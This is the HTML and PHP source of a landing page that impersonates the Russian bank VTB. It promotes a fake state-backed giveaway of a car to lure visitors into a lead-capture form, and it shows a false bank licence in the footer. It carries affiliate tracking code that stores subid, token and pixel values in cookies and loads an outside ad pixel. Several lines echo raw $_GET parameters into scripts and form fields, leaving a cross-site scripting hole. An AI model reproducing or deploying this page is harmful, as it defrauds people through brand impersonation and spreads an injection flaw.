<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ВТБ</title>
    <link rel="stylesheet" href="styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />
    <script src="./main.js"></script>
    <script src="jquery-3.6.1.min.js"></script>

    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
          bgdataLayer.push(arguments);
      }
      bge('init', '<?= $_GET['bge'] ?>');
    </script>
    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?= $_GET['bge'] ?>"
    ></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <img src="./img/logo.png" alt="ВТБ" />
    </header>
    <main class="main">
      <div class="main__header">
        <p class="main__heading">
          <span class="accent">РОЗЫГРЫШ</span> <br />
          5000 победителей
        </p>
      </div>
      <div class="main__image">
        <img src="./img/bg.png" alt="Background" />
      </div>
      <div class="main__text">
        <p class="main__text--first">
          НЕ УПУСКАЙ ВОЗМОЖНОСТЬ ВЫИГРАТЬ АВТОМОБИЛЬ
        </p>
        <p class="main__text--second">
          Государственная программа с поддержкой от ВТБ банк
        </p>
      </div>
      <button class="main__button">участвовать</button>
    </main>
    <footer class="footer">
      <p class="footer__text">
        © ВТБ, 2025 <br />Генеральная лицензия Банка России <br />
        №1000
      </p>
      <img src="./img/logo.png" alt="ВТБ" class="footer__logo" />
    </footer>
    <div id="modal" class="modal hidden">
      <div class="modal-content">
        <form
          class="form _main-form contact-form freg thin rounded"
          id="main-form"
          method="post"
        >
          <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
          <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
          <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
          type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
          type="hidden" id="source" value='<?= $_GET['source'] ?>'>
        </form>
      </div>
    </div>
    <script src="loadAssets.js?v=3444371"></script>

    <script>
      window.onpageshow = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
